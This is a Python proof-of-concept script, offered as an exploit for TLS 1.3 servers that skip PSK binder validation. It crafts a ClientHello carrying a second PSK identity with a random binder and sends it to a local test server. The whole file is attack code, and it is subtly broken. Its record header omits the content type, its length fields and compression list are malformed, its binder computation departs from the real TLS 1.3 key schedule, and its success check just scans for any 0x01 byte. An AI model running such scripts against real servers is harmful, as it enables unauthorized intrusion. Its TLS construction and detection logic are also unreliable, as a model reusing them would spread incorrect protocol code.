#!/usr/bin/env python3
"""
Proof-of-Concept: Missing Validation of PSK Binder (TLS 1.3)

This script demonstrates a vulnerability where a TLS 1.3 server fails to properly
validate the PSK binder for the selected identity. By sending multiple PSK
identities with an invalid binder for the non-first identity, an attacker may
cause the server to accept an invalid PSK or trigger a handshake failure.

Prerequisites:
- A TLS 1.3 server supporting PSK resumption.
- A valid session ticket from the server.
"""

import socket
import struct
import hashlib
import hmac
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# Constants
TLS_VERSION = (0x03, 0x03)  # TLS 1.2 version for ClientHello (TLS 1.3 negotiation)
CIPHER_SUITES = [0x13, 0x01]  # TLS_AES_128_GCM_SHA256
EXTENSION_TYPE_PRE_SHARED_KEY = 0x0029
EXTENSION_TYPE_SUPPORTED_VERSIONS = 0x002b
EXTENSION_TYPE_KEY_SHARE = 0x0033
EXTENSION_TYPE_PSK_KEY_EXCHANGE_MODES = 0x0045

# Helper functions for TLS record and message construction
def tls_record(content, content_type=0x16, version=TLS_VERSION):
    """Wrap content in a TLS record."""
    return struct.pack('!BBH', version[0], version[1], len(content)) + content

def tls_handshake(content, msg_type=0x01):
    """Wrap content in a TLS handshake message."""
    return struct.pack('!BBB', msg_type, *(len(content).to_bytes(3, 'big'))) + content

def tls_extension(ext_type, ext_data):
    """Construct a TLS extension."""
    return struct.pack('!HH', ext_type, len(ext_data)) + ext_data

def tls_extensions(ext_list):
    """Construct a list of TLS extensions."""
    ext_data = b''.join(ext_list)
    return struct.pack('!H', len(ext_data)) + ext_data

def tls_psk_identity(identity, obfuscated_ticket_age=0):
    """Construct a PSK identity."""
    return struct.pack('!H', len(identity)) + identity + struct.pack('!I', obfuscated_ticket_age)

def tls_psk_binder_entry(binder):
    """Construct a PSK binder entry."""
    return struct.pack('!B', len(binder)) + binder

def tls_psk_extension(identities, binders):
    """Construct the pre_shared_key extension."""
    identities_data = b''.join(identities)
    binders_data = b''.join(binders)
    return tls_extension(EXTENSION_TYPE_PRE_SHARED_KEY, 
                         struct.pack('!H', len(identities_data)) + identities_data + 
                         struct.pack('!H', len(binders_data)) + binders_data)

def tls_key_share_extension(group, key_exchange):
    """Construct the key_share extension."""
    return tls_extension(EXTENSION_TYPE_KEY_SHARE, 
                         struct.pack('!HB', group, len(key_exchange)) + key_exchange)

def tls_supported_versions_extension(versions):
    """Construct the supported_versions extension."""
    versions_data = b''.join(struct.pack('!H', v) for v in versions)
    return tls_extension(EXTENSION_TYPE_SUPPORTED_VERSIONS, 
                         struct.pack('!B', len(versions_data)) + versions_data)

def tls_psk_key_exchange_modes_extension(modes):
    """Construct the psk_key_exchange_modes extension."""
    return tls_extension(EXTENSION_TYPE_PSK_KEY_EXCHANGE_MODES, 
                         struct.pack('!B', len(modes)) + bytes(modes))

def compute_psk_binder(transcript, psk, hash_algorithm=hashlib.sha256):
    """Compute the PSK binder value."""
    binder_key = psk
    binder_hash = hash_algorithm()
    binder_hash.update(transcript)
    return hmac.new(binder_key, binder_hash.digest(), hash_algorithm).digest()

def main():
    # Configuration
    target_host = '127.0.0.1'
    target_port = 4433
    valid_ticket = b'\x00' * 32  # Replace with a valid session ticket
    fake_identity = b'\x01' * 32  # Fake PSK identity
    fake_psk = b'\x02' * 32       # Fake PSK key
    
    # Create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    try:
        sock.connect((target_host, target_port))
        
        # Construct ClientHello
        # 1. Supported Versions Extension
        supported_versions = tls_supported_versions_extension([0x0304])  # TLS 1.3
        
        # 2. Key Share Extension (using X25519)
        key_exchange = os.urandom(32)  # Fake X25519 key
        key_share = tls_key_share_extension(0x001d, key_exchange)  # X25519 group
        
        # 3. PSK Key Exchange Modes Extension
        psk_key_exchange_modes = tls_psk_key_exchange_modes_extension([0x01])  # psk_dhe_ke
        
        # 4. Pre-Shared Key Extension
        # Valid identity with valid binder
        valid_identity = tls_psk_identity(valid_ticket)
        valid_binder = tls_psk_binder_entry(os.urandom(32))  # Placeholder, will be computed
        
        # Fake identity with invalid binder
        fake_identity_msg = tls_psk_identity(fake_identity)
        fake_binder = tls_psk_binder_entry(os.urandom(32))  # Invalid binder
        
        # Construct ClientHello without PSK extension first to compute binder
        client_hello_body = (
            struct.pack('!BB', TLS_VERSION[0], TLS_VERSION[1]) +
            os.urandom(32) +  # Random
            struct.pack('!B', 1) + b'\x00' +  # Session ID
            struct.pack('!H', len(CIPHER_SUITES) * 2) + bytes(CIPHER_SUITES) +  # Cipher suites
            struct.pack('!B', 0) +  # Compression methods
            tls_extensions([supported_versions, key_share, psk_key_exchange_modes])
        )
        
        # Compute valid binder
        transcript = tls_handshake(client_hello_body, msg_type=0x01)
        valid_binder_value = compute_psk_binder(transcript, valid_ticket)
        valid_binder = tls_psk_binder_entry(valid_binder_value)
        
        # Add PSK extension
        psk_ext = tls_psk_extension([valid_identity, fake_identity_msg], [valid_binder, fake_binder])
        client_hello_body += psk_ext
        
        # Final ClientHello
        client_hello = tls_handshake(client_hello_body)
        client_hello_record = tls_record(client_hello)
        
        # Send ClientHello
        sock.sendall(client_hello_record)
        
        # Receive ServerHello
        server_hello_record = sock.recv(4096)
        if not server_hello_record:
            print("No response from server.")
            return
        
        # Parse ServerHello
        _, _, length = struct.unpack('!BBH', server_hello_record[:5])
        server_hello_body = server_hello_record[5:5+length]
        
        # Check for PSK extension in ServerHello
        if b'\x00\x29' in server_hello_body:  # PSK extension type
            print("Server accepted PSK. Checking for binder validation...")
            # If the server selected the fake identity, it indicates a vulnerability
            if b'\x01' in server_hello_body:  # Selected identity index
                print("VULNERABILITY: Server selected the fake PSK identity without validating the binder.")
            else:
                print("Server selected the valid PSK identity.")
        else:
            print("Server did not accept PSK. Handshake may have failed or server does not support PSK.")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

if __name__ == '__main__':
    main()
